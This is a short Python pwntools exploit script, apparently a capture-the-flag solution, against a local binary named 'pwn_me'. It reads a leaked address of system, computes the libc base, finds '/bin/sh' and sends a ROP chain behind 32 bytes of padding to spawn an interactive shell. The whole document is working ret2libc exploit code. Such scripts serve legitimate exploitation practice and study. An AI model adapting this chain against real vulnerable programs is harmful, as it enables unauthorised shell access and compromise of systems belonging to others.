#!/usr/bin/env python3

from pwn import *

offset = 32
padding = b'A' * offset

elf = context.binary = ELF('./pwn_me')
libc = elf.libc

def main():
	with process() as p:
		# Get system address in hex
		p.recvuntil(b'System is at: ')
		system_address = int(p.recv(), 16)
		log.success('System address: {}'.format(system_address))

		# Set our libc address to the system address
		libc.address = system_address - libc.sym['system']
		log.success('libc address: {}'.format(libc.address))

		# Get the address of /bin/sh from libc
		shell = next(libc.search(b'/bin/sh'))
		log.success('/bin/sh address: {}'.format(shell))

		# ROP chain
		rop = ROP(libc)
		rop.raw(padding)
		rop.system(shell)

		# Send the ROP chain
		p.sendline(rop.chain())
		log.success('Sending payload: {}'.format(rop.chain()))

		# Change to interactive shell
		try:
			p.interactive()
		except:
			log.failure('Failed to spawn an interactive shell')

if __name__ == '__main__':
	main()